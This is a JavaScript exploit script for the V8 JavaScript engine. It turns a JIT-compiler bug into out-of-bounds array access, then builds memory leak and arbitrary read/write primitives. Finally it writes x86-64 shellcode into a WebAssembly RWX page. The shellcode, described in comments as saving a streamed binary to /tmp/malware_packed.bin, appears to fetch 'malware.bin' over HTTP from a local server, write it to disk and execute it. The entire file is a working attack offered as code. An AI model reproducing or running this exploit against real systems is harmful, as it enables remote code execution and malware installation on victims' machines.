var fi_buf = new ArrayBuffer(8);
var f_buf = new Float64Array(fi_buf);
var i_buf = new BigUint64Array(fi_buf);

function f2i(value) {
	f_buf[0] = value;
	return i_buf[0];
}

function i2f(value) {
	i_buf[0] = value;
	return f_buf[0];
}


function fun(arg) {
  let x = arguments.length;
  a1 = new Array(0x10);
  a1[0] = 1.1;
  a2 = new Array(0x10);
  a2[0] = 1.1;
  a1[(x >> 16) * 21] = 1.39064994160909e-309;  // 0xffff00000000
  a1[(x >> 16) * 41] = 1.39064994160909e-309;  // 0xffff00000000
}

var a1, a2;
var a3 = [1.1,2.2];
a3.length = 0x11000;

for (let i = 0; i < 100000; i++) fun(1);
//%OptimizeFunctionOnNextCall(fun);

fun(...a3);

//console.log(a2.length);
//%DebugPrint(a1);
//%DebugPrint(a2);
//%SystemBreak();



var objLeak = {'leak': 0x1234, 'tag': 0x4567};
var offset_leak = 0;
for (let i = 0; i < 0xffff; i++) {
	if (f2i(a2[i]) == 0x456700000000) {
		offset_leak = i - 1;
		break;
	}
}

console.log('offset_leak = ' + offset_leak);

function addressOf(obj) {
	objLeak.leak = obj;
	return f2i(a2[offset_leak]);
}


var objTest = {'aaa': 123};


//%DebugPrint(objTest);
console.log('addressOf(objTest) = 0x' + addressOf(objTest).toString(16));
//%SystemBreak();


var buf2write = new ArrayBuffer(0xbeef);
var data_view = new DataView(buf2write);
var offset_backing_store = 0;

//%DebugPrint(buf2write);
//%SystemBreak();


for (let i = 0; i < 0xffff; i++) {
	if (f2i(a2[i]) == 0xbeef) {
		offset_backing_store = i + 1;
		break;
	}
}



function write64(addr, value) {
	a2[offset_backing_store] = i2f(addr);
	data_view.setFloat64(0, i2f(value), true);
}

function read64(addr) {
	a2[offset_backing_store] = i2f(addr);
	return f2i(data_view.getFloat64(0, true));
}



write64(addressOf(objTest) + 0x18n - 1n, 0x2333n);
//%DebugPrint(objTest);

console.log('value = 0x' + read64(addressOf(objTest) + 0x18n - 1n).toString(16));
//%SystemBreak();


var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

//%DebugPrint(f);
//%SystemBreak();



var f_addr = addressOf(f) - 1n;
var shared_info_addr = read64(f_addr + 0x18n) - 1n;
var data_addr = read64(shared_info_addr + 0x8n) - 1n;
var instance_addr = read64(data_addr + 0x10n) - 1n;
var rwx_page_addr = read64(instance_addr + 0xe8n);


// saves streamed binary to /tmp/malware_packed.bin
var sc_arr = [0x18ec8148e5894855n, 0x00000002bf000008n, 0x48d23100000001ben, 0x050f00000029c0c7n, 0x000001bf00f88348n, 0x48000001c88c0f00n, 0x64656bbe48fc4589n, 0xbe4856006e69622en, 0x6361705f65726177n, 0x2f706d742fbe4856n, 0x48e78948566c616dn, 0xc748000001c0c6c7n, 0x59050f00000055c0n, 0x0400248489485959n, 0xc748fff883480000n, 0x74840f00000006c7n, 0x0424bc8d48000001n, 0x000207c766000008n, 0x47c788130247c766n, 0xfc7d8b0100007f04n, 0x0000080424b48d48n, 0xc0c74800000010ban, 0x8348050f0000002an, 0x0f00000002bf00f8n, 0xfc7d8b000001328cn, 0x560a0d0a0dc6c748n, 0x312f50545448be48n, 0x657261be4856312en, 0xbe4856206e69622en, 0x776c616d2f636974n, 0x2f20544547be4856n, 0xbae6894856617473n, 0x4dd2314d00000024n, 0xc0c748c9314dc031n, 0x5959050f0000002cn, 0xbf00f88348595959n, 0x00cd8c0f00000003n, 0xfffbf0ad8d4c0000n, 0x8b0a0d0a0dbc41ffn, 0x0001baee894cfc7dn, 0xc0314dd2314d0000n, 0x002dc0c748c9314dn, 0x00f88348050f0000n, 0x0574fd6639440b7en, 0xad8d4cd2ebc5ff49n, 0x4cfc7d8bfffffbf0n, 0x4d00000001baee89n, 0xc9314dc0314dd231n, 0x0f0000002dc0c748n, 0x481d7e00f8834805n, 0x4c0000040024bc8bn, 0x000001c2c748ee89n, 0x00000001c0c74800n, 0x24bc8b48c0eb050fn, 0x03c0c74800000400n, 0x6bbe48050f000000n, 0x56006e69622e6465n, 0x705f65726177be48n, 0x6d742fbe48566361n, 0x8948566c616d2f70n, 0x48d23148f63148e7n, 0x050f0000003bc0c7n, 0x4800000005c7c748n, 0x894800000818c481n, 0x00003cc0c7485decn, 0x050f00n]

// saves streamed binary to /tmp/malware.bin
// var sc_arr = [0x18ec8148e5894855n, 0x00000002bf000008n, 0x48d23100000001ben, 0x050f00000029c0c7n, 0x000001bf00f88348n, 0x48000001b68c0f00n, 0x77be48006afc4589n, 0x566e69622e657261n, 0x6d2f706d742fbe48n, 0xc748e78948566c61n, 0xc0c748000001c0c6n, 0x5959050f00000055n, 0x0004002484894859n, 0xc7c748fff8834800n, 0x016b840f00000006n, 0x080424bc8d480000n, 0x66000207c7660000n, 0x0447c788130247c7n, 0x48fc7d8b0100007fn, 0xba0000080424b48dn, 0x2ac0c74800000010n, 0xf88348050f000000n, 0x8c0f00000002bf00n, 0x48fc7d8b00000129n, 0x48560a0d0a0dc6c7n, 0x2e312f50545448ben, 0x2e657261be485631n, 0x74be4856206e6962n, 0x56776c616d2f6369n, 0x732f20544547be48n, 0x24bae68948566174n, 0x314dd2314d000000n, 0x2cc0c748c9314dc0n, 0x595959050f000000n, 0x03bf00f883485959n, 0x0000c48c0f000000n, 0xfffffbf0ad8d4c00n, 0x7d8b0a0d0a0dbc41n, 0x000001baee894cfcn, 0x4dc0314dd2314d00n, 0x00002dc0c748c931n, 0x7e00f88348050f00n, 0x490574fd6639440bn, 0xf0ad8d4cd2ebc5ffn, 0x894cfc7d8bfffffbn, 0x314d00000001baeen, 0x48c9314dc0314dd2n, 0x050f0000002dc0c7n, 0x8b481d7e00f88348n, 0x894c0000040024bcn, 0x00000001c2c748een, 0x0f00000001c0c748n, 0x0024bc8b48c0eb05n, 0x0003c0c748000004n, 0xbe48006a050f0000n, 0x6e69622e65726177n, 0x2f706d742fbe4856n, 0x48e78948566c616dn, 0xc0c748d23148f631n, 0xc748050f0000003bn, 0xc4814800000005c7n, 0x5dec894800000818n, 0x0f0000003cc0c748n, 0x05n]

for (let i = 0n; i < sc_arr.length; i++) {
	write64(rwx_page_addr + i * 8n, sc_arr[i]);
}

console.log(f());
